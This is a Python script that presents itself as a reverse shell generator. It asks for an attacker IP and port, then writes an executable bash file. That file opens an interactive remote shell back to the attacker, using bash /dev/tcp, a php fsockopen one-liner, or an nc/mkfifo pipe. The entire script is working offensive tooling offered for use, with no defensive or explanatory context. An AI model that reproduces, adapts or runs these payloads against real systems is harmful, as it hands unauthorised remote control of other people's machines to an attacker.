#!/usr/bin/python
#Author: sidious

import os
import sys

def bAnner():
  print('''

██████  ███████ ██    ██ ███████ 
██   ██ ██      ██    ██ ██      
██████  █████   ██    ██ ███████ 
██   ██ ██       ██  ██       ██ 
██   ██ ███████   ████   ███████ 
     - Reverse shell generator                            
''')

def shell():

  ip = input("IPAddress: ")
  port = input("Port: ")
  
  if len(ip) < 1 or len(port) < 1:
    print('[!] IP/Port required.')
    exit(0)

  print(f"selected ip: {ip} and port: {port}\n")  

  file = open("rev", "w")
  file.write(f'''#!/bin/bash\n
if command -v bash > /dev/null 2>&1; then
  bash -i >& /dev/tcp/{ip}/{port} 0>&1
  exit;
fi\n\n
if command -v php > /dev/null 2>&1; then
  php -r '$sock=fsockopen({ip},{port});exec('/bin/sh -i <&3 >&3 2>&3');'
  exit;
fi\n\n
if command -v nc > /dev/null 2>&1; then
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f
  exit;
fi\n\n''')
	

def foofile():
	os.popen("chmod +x rev")

if __name__ == '__main__':
  bAnner()
  shell()
  foofile()
